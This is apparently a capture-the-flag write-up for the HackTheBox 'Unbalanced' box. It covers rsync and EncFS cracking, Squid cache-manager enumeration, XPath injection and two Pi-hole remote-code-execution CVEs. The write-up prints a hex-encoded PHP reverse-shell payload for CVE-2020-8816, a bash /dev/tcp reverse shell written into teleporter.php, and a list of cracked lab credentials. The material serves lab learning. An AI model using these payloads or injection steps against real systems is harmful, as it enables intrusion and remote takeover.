# Unbalanced - Hard

### Initial nmap scan
At first I've run `nmap -p- -v 10.10.10.200` to move as fast as possible, and further on I've run all the needed scripts using `nmap -sC -sV -p22,837,3128 -oN nmap/all 10.10.10.200`. So in the end the result was
```
# Nmap 7.91 scan initiated Tue Dec  1 15:31:11 2020 as: nmap -sC -sV -oN nmap/all -p22,3128,873 10.10.10.200
Nmap scan report for 10.10.10.200
Host is up (0.055s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  1 15:31:39 2020 -- 1 IP address (1 host up) scanned in 27.43 seconds
```

### Enumerating the rsync (873)
To take them in an order I've decided to look over the rsync first. Here we can list all the directory shares using `rsync -av --list-only rsync://10.10.10.200:873/`. Now to gather them we can just create a new directory and let them download, `rsync -av --list-only rsync://10.10.10.200:873/conf_backups ./rsync`.
After the download is finished we getr an entire folder which seems to be encrypted (if it wasn't that obvious from the directory description). If we look more closely we can see a file called `.encfs6.xml`. Well this seems to contain more information about the directory: It was encrypted using `EncFS 1.9.5` and we also get a key which seems to be AES-256. Here we can use [encfs2john.py](https://github.com/truongkma/ctf-tools/blob/master/John/run/encfs2john.py) which will help us crack the key. We paste the hash into a file and we run john with rockyou on it.
It has a hit: `bubblegum`. Now we must move the directory `rsync` to `~/encrypted` (i tried to do it in the same directory but somehow it didn't let me do it...) and we run `encfs -f -v ./rsync ~/decrypted`, paste the password that we've just found and voila we get an entire directory of `.conf` files. 
The only one that rised interest for me was `squid.conf` but it contained a lot of  lines starting with `#` so I've piped them to `cat 'squid.conf' | grep -v '#' |grep . > shrinkedSquid.conf` and now we have the right amount of information needed.
From here we find a new vhost `intranet.unbalanced.htb` and the fact that everything runs under a specific subnet, docker based, 172.16.0.0/12. Also at the bottom of the file we get a password for cache management system (??), which could've been accessed using the squidclient. So I've fast installed it using `apt install squidclient` and I've tried different options until I've reached to `squidclient -h 10.10.10.200 -u "intranet" -w 'Thah$Sh1' mgr:fqdncache` which gave me the exact information I needed: 
```
Address                                       Flg TTL Cnt Hostnames
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
```

### Exploiting the web (3128)
Now that we have all the subnet we must connect to the proxy and start looking around. In order to do this I've used FoxyProxy (A mozilla extension) and configured it this way:
```
Proxy Type: HTTP
Proxy IP: 10.10.10.200
Port: 3128
Username: intranet
```
Now we have a first look at the website and it doesn't have anything to interesting... just a login form and some pages. Checking the other seem to be the exact same replica. Well here I've been stuck a little until I've noticed the fact that we have `172.31.179.2` and `172.31.179.3` but there is no `172.31.179.1` so I checked it and I saw this `Host temporarily taken out of load balancing for security maintenance.`. I have tried to do `/intranet.php` (the exact same page as the others) and it worked. Well here I've run sqlmap but still didn't worked so I've tried different SQL injections until this worked `' or ''='`. It seemed a lot like an XPATH injection so I've decided to write a script in order to leak bryan's password (because he is the `System Administrator` so he must be our user.). The script can be found in this directory, under the name `xpathInjection.py`. The output of this was `Password: ireallireallyl0vebubblegum!!!` which seemed a bit odd. When i tried this on the ssh I got that password was wrong so I've tried `ireallyl0vebubblegum!!!` and it worked indeed. 

### Another subnet...
This part to be honest was kindof cool. In the main directory folder we've got a TODO file which pointed to another service on the box, Pi-hole which was planned to be release to the network. So I've downloaded the linpeas from my machine and ran it. Here there was another ip adress, that I didn't encounter yet `172.31.11.3`. 
When we go on the browser and we paste this we get a new website that says `Pi-hole`. This must be our path. I've changed to admin panel and than go to login. Here we can understand that the password is `admin` from the note `Set temporary admin password`. 

The version that is running on is 4.3.2 which has multiple RCE (Remote code execution) CVEs dated from 2020. This part from what I've understood can be done using metasploit module `exploit/unix/http/pihole_blocklist_exec` but it seemed way to complicated to setup the proxy again so I've decided to just do it manually (longer but less frustrating).
So in order to get the www-data shell I've followed this article related to [CVE-2020-8816](https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/). For this the payload that I've crafted was:
```
aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e282231302e31302e31342e38222c39303031293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));'&&
```
> Note: if you copy this from the site don't forget to sanitize them because otherwise it will not work.
Having the www-data shell I've started to look around for the ways to privesc and I've encountered another article related to [CVE-2020-11108](https://frichetten.com/blog/cve-2020-11108-pihole-rce/). With this cve you could've get both www-data shell and root... but I've seen it after the first one so I just overwrote the `teleporter.php` with 
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/9002 0>&1'");
```
And than I've executed on the shell `sudo pihole -a -t` and the listener on 9002 poped a shell. Now because I was root on the pihole container I've checked the root folder which leaked the actual root password for the main system: `/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'`, in the `pihole_config.sh` file. 

Now we go back on the shell that we had as `bryan` do `su -` and paste the password. Now we finally rooted.

# Credentials
- bryan:ireallyl0vebubblegum!!!
- root:bUbBl3gUm$43v3Ry0n3!
- $6$6HrNX81SE9mBkmNY$oIh9jCV496j4WOURXy/NYMp0cKFLavEAnpsK/KF.spP/yv8ONiIphzBsi3YnIVkFFgFEAak5yMaTi5zbMwIYw1 (root hash)